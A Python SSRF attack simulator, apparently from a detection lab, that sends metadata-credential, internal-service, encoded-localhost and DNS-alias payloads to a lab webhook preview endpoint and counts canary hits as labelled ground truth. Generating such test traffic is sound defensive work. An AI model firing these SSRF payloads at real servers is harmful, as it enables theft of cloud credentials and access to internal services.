"""SSRF_Simulator: `hunt_03_ssrf_egress.py` (Req 8.1, 8.2, 8.4, 8.5, 8.8).

Pre-flight checks the gateway, the Target_API, and the simulated metadata service via
`GET /api/v1/lab/status` (reached through the gateway, so a successful call proves both
the gateway and the Target_API are reachable; the response body's `metadata_service`
field reports the metadata service). If any component is unreachable, the simulator
exits non-zero, names the component, and sends zero SSRF requests.

Each SSRF payload is submitted as its own request to the webhook preview endpoint
(`POST /api/v1/webhooks/preview`), which performs the real outbound fetch server-side.
Payloads cover: the simulated cloud metadata endpoint, an internal Lab service, four
alternate IP encodings of 127.0.0.1:8001 (decimal, octal, hex, IPv6-mapped), and a DNS
alias that resolves to an internal Lab address. `--mode` selects pacing only.

On completion the simulator prints the count of requests sent and the count of
responses whose body contains a lab canary (`LAB-METADATA-CANARY` or
`LAB-INTERNAL-CANARY`), per Req 8.5.
"""
from __future__ import annotations

import argparse
import sys
import time
from dataclasses import dataclass
from typing import Callable

from labcommon import params
from simulators.common import GroundTruth, SimClient, add_common_args

SCENARIO = "ssrf"
LAB_STATUS_PATH = "/api/v1/lab/status"
PREVIEW_PATH = "/api/v1/webhooks/preview"

METADATA_CANARY = "LAB-METADATA-CANARY"
INTERNAL_CANARY = "LAB-INTERNAL-CANARY"
CANARIES = (METADATA_CANARY, INTERNAL_CANARY)

METADATA_URL = "http://169.254.169.254/latest/meta-data/iam/security-credentials/lab-role"
INTERNAL_SERVICE_URL = "http://target-api:8001/internal/secret"
DNS_ALIAS_URL = "http://meta.lab.internal:8001/internal/secret"

# Alternate IP encodings of 127.0.0.1:8001 (Req 8.4): decimal, octal, hex, IPv6-mapped.
ALT_ENCODING_URLS = (
    "http://2130706433:8001/internal/secret",       # decimal
    "http://0177.0.0.1:8001/internal/secret",        # octal
    "http://0x7f.0.0.1:8001/internal/secret",        # hex
    "http://[::ffff:7f00:1]:8001/internal/secret",   # IPv6-mapped
)

# Pacing presets selected by --mode; explicit control is left to the caller via sleep.
MODE_DELAY_S = {"low-and-slow": 2.0, "noisy": 0.0}


@dataclass(frozen=True)
class Technique:
    name: str
    url: str


def build_payloads() -> list[Technique]:
    """Every SSRF payload, each to be sent in its own request (Req 8.1, 8.4)."""
    payloads = [Technique("metadata_service", METADATA_URL)]
    payloads.append(Technique("internal_service", INTERNAL_SERVICE_URL))
    payloads.extend(Technique("alt_encoding", url) for url in ALT_ENCODING_URLS)
    payloads.append(Technique("dns_alias", DNS_ALIAS_URL))
    return payloads


class PreflightError(Exception):
    """Raised with the name of the unreachable component."""


def preflight(client: SimClient) -> None:
    """Confirm the gateway, Target_API, and metadata service are reachable (Req 8.8).

    A successful `GET /api/v1/lab/status` through the gateway proves the gateway and
    the Target_API are both up. Its `metadata_service` field reports the third
    component. Any failure raises PreflightError naming the unreachable component.
    """
    try:
        resp = client.get(LAB_STATUS_PATH)
    except Exception as exc:  # noqa: BLE001 - any transport failure means unreachable
        raise PreflightError(f"gateway or target-api unreachable: {exc}") from None
    if resp.status_code != 200:
        raise PreflightError(f"target-api unreachable (status {resp.status_code})")
    try:
        body = resp.json()
    except ValueError:
        raise PreflightError("target-api unreachable: invalid /api/v1/lab/status response") from None
    if body.get("metadata_service") != "up":
        raise PreflightError("metadata service unreachable")


def run(client: SimClient, payloads: list[Technique],
        delay_s: float, sleep: Callable[[float], None]) -> tuple[int, int]:
    """Send each payload in its own request. Returns (requests_sent, canary_hits)."""
    sent = 0
    canary_hits = 0
    for i, payload in enumerate(payloads):
        if i > 0 and delay_s > 0:
            sleep(delay_s)
        sent += 1
        try:
            resp = client.post(PREVIEW_PATH, json_body={"url": payload.url},
                               technique=payload.name)
        except Exception:  # noqa: BLE001 - network/timeout failures count as sent, no hit
            continue
        try:
            body_text = resp.text
        except Exception:  # noqa: BLE001
            continue
        if any(canary in body_text for canary in CANARIES):
            canary_hits += 1
    return sent, canary_hits


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="SSRF/egress attack simulator")
    add_common_args(parser)
    args = parser.parse_args(argv)
    mode = params.resolve_mode(args.mode)

    gt = GroundTruth(label="attack", scenario=SCENARIO, role="attack_action")
    client = SimClient(args.target, gt, run_id=None if args.seed is None else str(args.seed))
    try:
        try:
            preflight(client)
        except PreflightError as exc:
            print(f"error: {exc}", file=sys.stderr)
            return 1

        payloads = build_payloads()
        sent, canary_hits = run(client, payloads, MODE_DELAY_S[mode], time.sleep)
    finally:
        client.close()

    print(f"requests sent: {sent}")
    print(f"responses containing a lab canary: {canary_hits}")
    return 0


if __name__ == "__main__":  # pragma: no cover - process entrypoint
    raise SystemExit(main())
